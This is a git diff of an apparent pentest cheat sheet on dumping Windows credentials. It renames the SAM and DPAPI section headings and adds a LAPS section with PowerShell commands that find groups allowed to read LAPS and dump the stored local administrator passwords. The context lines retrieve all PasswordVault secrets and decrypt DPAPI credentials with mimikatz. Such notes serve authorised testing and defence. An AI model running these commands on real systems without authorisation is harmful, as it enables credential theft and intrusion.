@@ -28,7 +28,7 @@ if the logonpassword command returns an error `Handle on memory (0x00000005)` us
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 ```
 
-## SAM credentials dump
+## SAM
 
 ### Dumping
 
@@ -138,7 +138,7 @@ $VaultObj = new-object Windows.Security.Credentials.PasswordVault
 $VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
 ```
 
-## DPAPI hash dump
+## DPAPI
 
 Usual credential files position
 
@@ -166,4 +166,33 @@ Decrypt other hashes with the master key
 
 ```
 dpapi::cred /in:"<path to CredHash>"
+```
+
+## LAPS
+
+Verify that LAPS is installed by searching for `admpwd.dll` usually in `C:\Program Files\LAPS\CSE`
+
+Check available commands in PowerShell
+
+```
+Get-Command *AdmPwd*
+```
+
+Find groups allowed to interact with LAPS
+
+```
+Find-AdmPwdExtendedRights -Identity *
+Find-AdmPwdExtendedRights -Identity <user>
+```
+
+Get users of the detected group
+
+```
+net groups "<group>"
+```
+
+Run the following command in the context of a user part of the  group allowed to interact with LAPS to dump the stored passwords. The target is the machine with LAPS enabled
+
+```
+Get-AdmPwdPassword -ComputerName <target>
 ```
